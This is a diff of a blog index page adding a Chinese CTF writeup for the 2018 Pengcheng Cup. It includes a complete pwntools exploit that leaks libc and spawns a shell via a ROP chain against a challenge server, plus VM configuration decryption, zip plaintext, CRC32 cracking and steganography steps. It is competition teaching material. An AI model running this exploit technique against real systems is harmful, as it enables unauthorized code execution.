@@ -150,6 +150,148 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    15 分钟 读完 (大约 2229 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/12/pcb-writeup/">PCB鹏程杯2018 writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="overInt"><a href="#overInt" class="headerlink" title="overInt"></a>overInt</h2><blockquote>
+<p>附带大佬的writeup</p>
+</blockquote>
+<p>先过两关检测，然后有：<br><em>(&amp;v8 + v6) = v5;<br>v3 = (int </em>)(unsigned int)v5;<br>printf(“str_pos is %c\n”, v3);<br>可以一位位的修改栈上任意地址</p>
+<p>大佬说才100，只能写这么多了。完整exp如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack</span><br><span class="line">context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)</span><br><span class="line">local = <span class="hljs-number">1</span></span><br><span class="line">log_level=<span class="hljs-string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">	p = process(<span class="hljs-string">"./overInt"</span>)<span class="hljs-comment">#,env=&#123;'LD_PRELOAD':'./libc_x64.so.6'&#125;)</span></span><br><span class="line">	elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line">	<span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">	p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)</span><br><span class="line">	elf = ELF(<span class="hljs-string">"./overInt"</span>)</span><br><span class="line">	<span class="hljs-comment">#libc = ELF('./libc_x64.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_addr</span><span class="hljs-params">(num,string)</span>:</span></span><br><span class="line">	j = <span class="hljs-number">0</span></span><br><span class="line">	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):</span><br><span class="line">		p.recvuntil(<span class="hljs-string">"Which position you want to modify?\n"</span>)</span><br><span class="line">		payload = p32(num)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		p.recvuntil(<span class="hljs-string">"What content you want to write in?\n"</span>)</span><br><span class="line">		payload = string[j]</span><br><span class="line">		p.send(payload)</span><br><span class="line">		num += <span class="hljs-number">1</span></span><br><span class="line">		j += <span class="hljs-number">1</span></span><br><span class="line">		</span><br><span class="line">pop_rdi = <span class="hljs-number">0x0000000000400b13</span></span><br><span class="line">read_got = elf.got[<span class="hljs-string">"read"</span>] <span class="hljs-comment"># 0x602038</span></span><br><span class="line">alarm_got = elf.got[<span class="hljs-string">"alarm"</span>] <span class="hljs-comment"># 0x602030</span></span><br><span class="line">start = <span class="hljs-number">0x4005D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="hljs-string">"puts"</span>] <span class="hljs-comment"># 0x40054c</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">	data = p.recv()</span><br><span class="line">	p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv() </span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">32</span>))</span><br><span class="line"></span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x38\x20\x60\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#read_got</span></span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\x4c\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#puts_plt</span></span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line">string = <span class="hljs-string">"\xd0\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#start</span></span><br><span class="line">change_addr(<span class="hljs-number">0x50</span>,string)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"!"</span>)</span><br><span class="line">data = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-keyword">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)</span><br><span class="line">data = u64(data)</span><br><span class="line">libc_base = data - <span class="hljs-number">0x0f7250</span></span><br><span class="line">binsh_addr = libc_base + <span class="hljs-number">0x18cd57</span></span><br><span class="line">system_addr = libc_base + <span class="hljs-number">0x045390</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)</span><br><span class="line">p.send(<span class="hljs-string">"over"</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">10</span>))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):</span><br><span class="line">	data = p.recv()</span><br><span class="line">	p.send(p32(<span class="hljs-number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="hljs-number">0x20633372</span>))</span><br><span class="line">p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)</span><br><span class="line">p.send(p32(<span class="hljs-number">24</span>))</span><br><span class="line">string = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-comment">#pop_rdi</span></span><br><span class="line">change_addr(<span class="hljs-number">0x38</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,binsh_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x40</span>,string)</span><br><span class="line">string = pack(<span class="hljs-string">'L'</span>,system_addr)</span><br><span class="line">change_addr(<span class="hljs-number">0x48</span>,string)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="hack1t"><a href="#hack1t" class="headerlink" title="hack1t"></a>hack1t</h2><p>打开虚拟机发现需要密码，把题目描述中的<code>bibinb</code>输入进行就行。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/1.png"><br></div>
+
+<p>打开虚拟机后发现需要用户账号密码才进得去，随便试了一下都以失败告终，所以考点就是绕过用户验证，按常规套路来说在系统启动是强行进入<code>GRUB</code>，然后改密码，但发现进<code>GRUB</code>也需要密码：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/2.png"><br></div>
+
+<p>所以这条路也行不通，那么另一个思路就是在加载系统时加载一个<code>ISO</code>，然后进入系统，再ISO镜像中对原来的硬盘进行操作。但发现修改虚拟机配置需要密码，而这个密码跟上面的不一样。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/3.png"><br></div>
+
+<p>所以这条路暂时也没辙了。回过头查看下虚拟机的配置文件如<code>vmx、nvram</code>等，发现都已经被加密，正常的配置文件是键值对存储，而加密后的则如下：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.encoding = &quot;UTF-8&quot;</span><br><span class="line">displayName = &quot;Ubuntu 64-bit&quot;</span><br><span class="line">policy.vm.sourcevmid = &quot;52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29&quot;</span><br><span class="line">encryption.keySafe = &quot;vmware:key/list/(pair/(phrase/a%2bFUjt......))&quot;</span><br><span class="line">encryption.data = &quot;A8Y2HMBeynR9AnL.....&quot;</span><br></pre></td></tr></table></figure>
+<p>因为虚拟机的配置是通过文件来实现的，所以如果我们能直接修改配置文件也能达到我们想要的结果，经过一番搜索后找到了一些有用的资料，在VMware的社区上发现了一个issue，有个大神实现了对vmx加密算法的破解和运用，并且发布到了GitHub中。</p>
+<ul>
+<li><a href="https://communities.vmware.com/thread/582158" target="_blank">issue链接</a></li>
+<li><a href="https://github.com/RF3/VMwareVMX" target="_blank">GitHub项目</a></li>
+</ul>
+<p>当然使用这个工具解密是会<code>Will ask for the password</code>，但我们还是可以再碰一下bibinb这个密码。</p>
+<p>其实这个工具很早就下下来了，但当时不会用，其实是它的脚本写的有瑕疵，坑爹了，给我报了个error：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/4.png"><br></div>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot read from file Ubuntu 64-bit.vmx.bak</span><br></pre></td></tr></table></figure>
+<p>但拿去操作正常的vmx文件又是可以的，当时也没怎么多想，就把工具放在了一边，继续找资料，但后来就觉得这个错误或许可以跟一下，而正是这个决定让我拿下这题。打开<code>main.py</code>，很容易就发现了问题所在，程序进来后会判断：</p>
+<figure class="highlight py hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:</span><br><span class="line">    <span class="hljs-keyword">if</span> displayname <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:</span><br><span class="line">        match = re.match(<span class="hljs-string">'displayName *= *"(.+)"\n'</span>, line)</span><br><span class="line">        <span class="hljs-keyword">if</span> match:</span><br><span class="line">            displayname = match.group(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">'encryption.keySafe'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        keysafe = line</span><br><span class="line">    <span class="hljs-keyword">elif</span> <span class="hljs-string">'encryption.data'</span> <span class="hljs-keyword">in</span> line:</span><br><span class="line">        data = line</span><br></pre></td></tr></table></figure>
+<p>而在观察中发现它给的<code>displayname</code>是小写，而判断是大写，直接改一下试试：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/5.png"><br></div>
+
+<p>改好后直接跑，发现成功解密出配置：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/6.png"><br></div>
+
+<p>那么接下来就好办了，先在其他虚拟机上配置一个<code>CDROM</code>，看一下它的vmx配置文件怎么写，然后我们照抄过来，然后在加密回去就行，下面是配置cdrom：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sata0:1.deviceType = &quot;cdrom-image&quot;</span><br><span class="line">sata0:1.fileName = &quot;E:\kali-linux-2018.1-i386.iso&quot;</span><br><span class="line">sata0:1.present = &quot;TRUE&quot;</span><br><span class="line">usb.present = &quot;TRUE&quot;    # USB开启</span><br></pre></td></tr></table></figure>
+<p>然后在把解密出来的文件中的中文随便改成什么英文，防止python的编码错误。</p>
+<figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -e -D <span class="hljs-string">"Ubuntu 64-bit"</span> -p bibinb reconver.vmx myencry.vmx</span><br></pre></td></tr></table></figure>
+<p>改好后替换掉原来的文件，然后在虚拟机配置中就能看到cdrom和USB已被开启。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/7.png"><br></div>
+
+<p>紧接着在虚拟机启动时按<code>ESC</code>选择从<code>CD-ROM</code>中启动，这样就能进去系统，从而操作文件系统。</p>
+<p>将四个部分的rar压缩包放在同一个文件夹，然后解压：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/8.png"><br></div>
+
+<p>拿到flag。</p>
+<h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><p>这是一个交通灯的<code>gif</code>，用<code>file</code>、<code>binwalk</code>检查后都很正常，猜测可能是灯的闪烁代表0,1。网上找了个分离每帧git的python脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">gifFileName = <span class="hljs-string">'Traffic_Light.gif'</span></span><br><span class="line"><span class="hljs-comment">#使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span></span><br><span class="line">im = Image.open(gifFileName)</span><br><span class="line">pngDir = gifFileName[:<span class="hljs-number">-4</span>]</span><br><span class="line"><span class="hljs-comment">#创建存放每帧图片的文件夹</span></span><br><span class="line">os.mkdir(pngDir)</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">  <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    <span class="hljs-comment">#保存当前帧图片</span></span><br><span class="line">    current = im.tell()</span><br><span class="line">    im.save(pngDir+<span class="hljs-string">'/'</span>+str(current)+<span class="hljs-string">'.png'</span>)</span><br><span class="line">    <span class="hljs-comment">#获取下一帧图片</span></span><br><span class="line">    im.seek(current+<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> EOFError:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>结果得到1168个项目。。。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/9.png"><br></div>
+
+<p>没想到快捷方法，，只能手动过了一遍得到，先把绿灯当做1，红灯为0，黄灯为空格：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">10011001 10010011 10011110 10011000 10000100</span><br><span class="line">10101111 10010011 11001100 11001011 10001100</span><br><span class="line">11001100 10100000 10001111 11001011 10000110</span><br><span class="line">10100000 11001011 10001011 10001011 11001100</span><br><span class="line">10010001 10001011 11001110 11001111 10010001</span><br><span class="line">10100000 10001011 11001111 10100000 10001011</span><br><span class="line">10001101 11001011 10011001 10011001 11001110</span><br><span class="line">10011100 10100000 10001100 11001011 10011001</span><br><span class="line">11001100 10001011 10000110 10100000 10001000</span><br><span class="line">10010111 11001100 10010001 10100000 10000110</span><br><span class="line">11001111 10001010 10100000 11001011 10001101</span><br><span class="line">11001100 10100000 11001111 10001010 10001011</span><br><span class="line">10001100 11001110 10011011 11001100 10000010</span><br></pre></td></tr></table></figure>
+<p>结果也发现每8个红绿灯就有一个黄灯，刚好分隔开，写个脚本跑一下：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="hljs-string">'./temp'</span>, <span class="hljs-string">'r'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> oneline <span class="hljs-keyword">in</span> f.readlines():</span><br><span class="line">    numbers = oneline.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> numbers:</span><br><span class="line">        one = one.replace(<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>).replace(<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>).replace(<span class="hljs-string">'2'</span>,<span class="hljs-string">'0'</span>)</span><br><span class="line">        flag += chr(int(one, <span class="hljs-number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>上面之所以做了替换时因为绿灯跟红灯代表的0/1给弄反了。。</p>
+<h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><p>Binwalk后发现有很多东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/10.png"><br></div>
+
+<p>Foremost后可以得到:</p>
+<div align="center"><br>    <img src="/images/posts/pcb/11.png"><br></div>
+
+<p>其中zip2.zip是加密的，而且里面有一个2-stage的文件，再看上面得到了，容易联想到明文攻击。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/12.png"><br></div>
+
+<p>我们把上面的2-stage.what的what去掉，然后用Ubuntu自带的<code>zip</code>去压缩，7z和WinRAR压缩出来的<code>都不行</code>，ARCHPR识别不了。最后密码是Hello_Hi。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/13.png"><br></div>
+
+<p>但flowerdance的内容令人失望，并没有有价值的东西。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/14.png"><br></div>
+
+<p>File一下2-stage可以发现是jpg，直接改成jpg。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/15.png"><br></div>
+
+<p>再根据提示用cloacked-pixel对这个图片进行处理，使用：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/16.png"><br></div>
+
+<p>可以得到一个zip文件，内容如下：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/17.png"><br></div>
+
+<p>但zip3、zip4都需要密码。前面得到的密码都对不上，而且发现这里zip3.zip中的guess文件只有4字节，可以考虑CRC32碰撞攻击。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/18.png"><br></div>
+
+
+<p>这里使用<code>hashcat</code>神器，<code>-D 2</code>表示<code>GPU</code>破解。<br><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -a 3 -m 11500 -D 2 --force --increment --increment-min 4 --increment-max 6 --force 99bed60e:00000000 ?a ?a?a?a?a?a</span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/pcb/19.png"><br></div>
+
+<p>结果只需<code>2s</code>，神器不亏是神器。。。</p>
+<p>但密码不是zip3的，是zip4的。。然而还是没惊喜</p>
+<div align="center"><br>    <img src="/images/posts/pcb/20.png"><br></div>
+
+<p>回头再看那个docx文件，突然发现还有隐藏的东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/21.png"><br></div>
+
+<p>直接将docx改成zip提取嵌入对象，在media里有新的东西：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/22.png"><br></div>
+
+<p>其中image1.emf能打开，而i_love_you.emf却不行，但观察它的文件结尾，可以看到是zip的格式，binwalk也得出zip end。</p>
+<div align="center"><br>    <img src="/images/posts/pcb/23.png"><br></div>
+
+<p>在观察发现i_love_you.emf跟zip4.zip的文件大小相同，考虑异或一下两个文件，这里直接Google代码：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> binascii</span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 每个字节转成hex，0x顺便去掉，对于不足两位的补0</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2hex</span><span class="hljs-params">(str)</span>:</span></span><br><span class="line">    hexs = []</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str:</span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>))</span><br><span class="line">        <span class="hljs-keyword">if</span> len(tmp) == <span class="hljs-number">2</span>:</span><br><span class="line">            hexs.append(tmp)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            hexs.append(<span class="hljs-string">'0'</span> + tmp)</span><br><span class="line">    <span class="hljs-keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [<span class="hljs-string">'0'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>]</span><br><span class="line">arr2 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tran</span><span class="hljs-params">(r)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(arr)):</span><br><span class="line">        <span class="hljs-keyword">if</span> r == arr[i]:</span><br><span class="line">            <span class="hljs-keyword">return</span> arr2[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\docx\\word\\media\\I_Love_You.emf'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">f2 = open(<span class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\zip4.zip'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">hexs = []</span><br><span class="line">hexs2 = []</span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    t = f.readline()</span><br><span class="line">    t2 = f2.readline()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> t <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> t2:</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    hexs.extend(str2hex(t))</span><br><span class="line">    hexs2.extend(str2hex(t2))</span><br><span class="line">f.close()</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line">ff = open(<span class="hljs-string">'out.txt'</span>, <span class="hljs-string">'wb'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(min(len(hexs), len(hexs2))):</span><br><span class="line">    a = tran(hexs[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs[i][<span class="hljs-number">1</span>])</span><br><span class="line">    b = tran(hexs2[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs2[i][<span class="hljs-number">1</span>])</span><br><span class="line">    B = struct.pack(<span class="hljs-string">'B'</span>, a ^ b)</span><br><span class="line">    ff.write(B)</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure></p>
+<p>最终可以发现出来的是一个zip，相信这个才是完整的zip，用密码打开后：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/24.png"><br></div>
+
+
+
+
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-11-30T14:05:56.000Z">2018-11-30</time>
                 
                 
@@ -540,82 +682,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-05-09T14:47:56.000Z">2018-05-09</time>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    14 分钟 读完 (大约 2158 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/05/ddctf-writeup5/">DDCTF2018 2道web writeup</a>
-            
-        </h1>
-        <div class="content">
-            <a id="more"></a>
-<h2 id="我的博客"><a href="#我的博客" class="headerlink" title="我的博客"></a>我的博客</h2><blockquote>
-<p>提示：<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
-</blockquote>
